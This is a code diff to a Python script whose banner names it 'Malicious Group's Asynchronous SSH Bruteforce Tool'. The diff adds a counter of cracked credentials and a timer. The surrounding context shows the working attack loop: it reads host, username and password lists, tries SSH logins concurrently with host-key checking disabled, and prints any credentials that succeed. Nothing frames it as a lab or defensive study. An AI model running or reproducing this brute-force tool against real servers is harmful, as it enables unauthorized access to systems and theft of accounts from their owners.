@@ -4,6 +4,7 @@ import argparse
 import logging
 import asyncio
 import random
+import time
 
 from sys import argv
 from pathlib import Path
@@ -20,6 +21,7 @@ class SshTFU:
         self._workers = int(workers)
         self._timeout_list = []
         self._ignore_list = []
+        self.found = 0
 
     @staticmethod
     def _return_list(item):
@@ -62,6 +64,7 @@ class SshTFU:
                     await asyncio.wait_for(
                         asyncssh.connect(h, username=u, password=p, port=port, known_hosts=None), timeout=5)
                     print(f" 🠖 Credentials Found: {h:16} - ({u}:{p})                                                  ")
+                    self.found += 1
                 except asyncssh.PermissionDenied:
                     break
                 except asyncio.TimeoutError:
@@ -129,7 +132,10 @@ if __name__ == "__main__":
         arg.workers = 10
 
     print(f"\n[ Malicious Group's Asynchronous SSH Bruteforce Tool ]\n")
+    t = time.process_time()
 
     MaliciousGroup = SshTFU("/tmp/hosts.txt", "/tmp/users.txt", "/tmp/passwords.txt", 20)
     asyncio.run(MaliciousGroup.main())
-    print("--fin--")
+
+    elapsed_time = time.process_time() - t
+    print(f"All {arg.workers} Workers Completed! {MaliciousGroup.found} credentials found in {elapsed_time} seconds \n")
